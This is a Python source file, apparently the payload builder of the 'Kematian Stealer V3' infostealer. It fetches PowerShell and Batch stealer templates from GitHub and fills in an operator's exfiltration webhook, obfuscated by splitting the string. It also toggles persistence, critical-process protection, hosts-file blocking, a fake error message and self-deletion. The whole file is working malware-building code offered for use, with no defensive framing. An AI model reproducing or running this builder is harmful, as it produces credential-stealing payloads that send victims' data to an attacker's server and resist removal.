import requests


class BuildPayload:
    def __init__(self):
        self.langs = [
            "Powershell",
            "Batch",
        ]

    def build(self, language: str, url: str, options: dict[str, bool]) -> bool:
        match language:
            case "Powershell":
                self.build_ps1(url, options)
                return True
            case "Batch":
                self.build_bat(url, options)
                return True
            case _:
                return False

    def get_languages(self) -> list[str]:
        return self.langs

    def build_bat(self, url: str, options: dict[str, bool]) -> None:
        github_raw_url_bat = "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.bat"
        content = requests.get(github_raw_url_bat).text.strip()

        content = content.replace(
            "$webhook = 'YOUR_URL_HERE_SERVER'", f"$webhook = 'h' + '{url[1:]}/data'"
        )

        content = (
            content.replace(
                "$debug = $false", f"$debug=${str(options['debug']).lower()}"
            )
            .replace(
                "$blockhostsfile = false",
                f"$blockhostsfile=${str(options['blockhostsfile']).lower()}",
            )
            .replace(
                "$criticalprocess = false",
                f"$criticalprocess=${str(options['criticalprocess']).lower()}",
            )
            .replace("$melt = false", f"$melt=${str(options['melt']).lower()}")
            .replace(
                "$fakeerror = false",
                f"$fakeerror=${str(options['fakeerror']).lower()}",
            )
            .replace(
                "$persistence = false",
                f"$persistence=${str(options['persistence']).lower()}",
            )
        )

        with open("kdot.bat", "w", newline="") as f:
            f.write(content)

    def build_ps1(self, url: str, options: dict[str, bool]) -> None:
        github_raw_url_ps1 = "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer-V3/main/frontend-src/main.ps1"
        content = requests.get(github_raw_url_ps1).text.strip()

        content = content.replace(
            '#$webhook = "YOUR_URL_HERE_SERVER"', f"$webhook = 'h' + '{url[1:]}/data'"
        )

        content = (
            content.replace(
                "#$debug = $false", f"$debug = ${str(options['debug']).lower()}"
            )
            .replace(
                "#$blockhostsfile = $false",
                f"$blockhostsfile = ${str(options['blockhostsfile']).lower()}",
            )
            .replace(
                "#$criticalprocess = $false",
                f"$criticalprocess = ${str(options['criticalprocess']).lower()}",
            )
            .replace("$melt = $false", f"$melt = ${str(options['melt']).lower()}")
            .replace(
                "#$fakeerror = $false",
                f"$fakeerror = ${str(options['fakeerror']).lower()}",
            )
            .replace(
                "#$persistence = $false",
                f"$persistence = ${str(options['persistence']).lower()}",
            )
            .replace("#$melt = $false", f"$melt = ${str(options['melt']).lower()}")
        )

        with open("kdot.ps1", "w", newline="") as f:
            f.write(content)
